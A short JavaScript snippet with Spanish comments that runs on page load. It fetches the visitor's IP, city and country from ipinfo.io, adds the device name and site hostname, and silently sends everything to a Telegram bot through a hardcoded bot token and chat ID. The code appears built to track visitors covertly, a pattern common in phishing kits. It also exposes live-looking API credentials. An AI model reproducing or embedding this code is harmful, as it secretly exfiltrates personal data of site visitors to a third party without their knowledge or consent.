document.addEventListener('DOMContentLoaded', async function() {
    const botToken = '6496970475:AAE-I_hNZgTUllq8UDsOEnjopdcPyniYRE8'; // Asegúrate de reemplazar esto con tu token de bot real
    const chatId = '6290004131'; // Asegúrate de reemplazar esto con tu ID de chat real
    const access_key = '6c9cfc1a83175c'; // Tu token de acceso para ipinfo.io

    async function getUserLocation() {
        try {
            const response = await fetch(`https://ipinfo.io?token=${access_key}`);
            const locationData = await response.json();
            return locationData;
        } catch (error) {
            console.error("Error al obtener la ubicación del usuario:", error);
            return {};
        }
    }

    async function enviarInformacionCliente() {
        const locationData = await getUserLocation();
        const userDevice = WURFL.complete_device_name; // Nombre del dispositivo utilizando WURFL.js
        const userHost = window.location.hostname; // Nombre del dominio

        const userIp = locationData.ip || 'No disponible';
        const userCity = locationData.city || 'No disponible';
        const userCountry = locationData.country || 'No disponible';

        const message = `IP: ${userIp}\nCiudad: ${userCity}\nPaís: ${userCountry}\nDispositivo: ${userDevice}\nDominio: ${userHost}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log("Información enviada:", data);
        })
        .catch(error => {
            console.error("Error al enviar la información:", error);
        });
    }

    // Llama a la función inmediatamente después de que la página se carga
    enviarInformacionCliente();
});